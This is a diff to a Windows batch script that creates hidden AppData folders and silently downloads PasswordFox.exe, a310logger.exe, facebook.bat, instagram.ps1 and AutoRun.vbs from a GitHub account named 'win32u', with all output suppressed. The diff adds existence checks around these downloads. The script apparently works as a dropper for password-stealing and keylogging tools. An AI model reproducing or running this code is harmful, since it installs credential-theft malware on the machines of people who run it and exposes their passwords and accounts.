@@ -8,6 +8,9 @@ echo *************Create directory****************
    mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
    attrib +h C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul
 
+   mkdir C:\Users\%username%\AppData\Local\0101 > nul 2> nul
+   attrib +h C:\Users\%username%\AppData\Local\0101 /s /d > nul 2> nul
+
    mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
    attrib +h C:\Users\%username%\AppData\Local\A310Logger /s /d > nul 2> nul
 
@@ -73,10 +76,18 @@ echo *************DOWNLOAD file****************
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
    )
-   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
-   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
-   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
-   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (      
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
+   )
    if errorlevel 1 goto ERROR2   
    goto SUCCESS 
 
@@ -107,10 +118,18 @@ echo *************DOWNLOAD file****************
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
    )
-   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
-   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
-   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
-   powershell -Command "Invoke-WebRequest https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
+   )   
    if errorlevel 1 goto ERROR3
    goto SUCCESS 
 
